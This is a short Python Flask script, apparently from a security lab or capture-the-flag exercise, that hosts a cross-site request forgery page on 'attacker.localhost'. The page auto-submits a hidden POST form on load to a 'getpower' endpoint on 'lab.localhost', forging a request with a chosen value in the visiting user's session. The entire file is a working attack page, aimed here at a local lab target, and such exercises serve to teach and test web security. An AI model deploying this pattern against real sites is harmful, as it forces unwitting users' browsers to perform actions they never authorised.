from flask import Flask, render_template_string

app = Flask("pwnc")


@app.route("/")
def hello():
    # auto-submit on page load
    html_form = """<html>
    <body onload="document.getElementById('leakForm').submit();">
        <form id="leakForm" action="http://lab.localhost/getpower" method="POST">
            <input type="hidden" name="powernum" id="powernum" value=1337>
        </form>
    </body>
</html>
"""
    return render_template_string(html_form)


app.run("attacker.localhost", 9999)
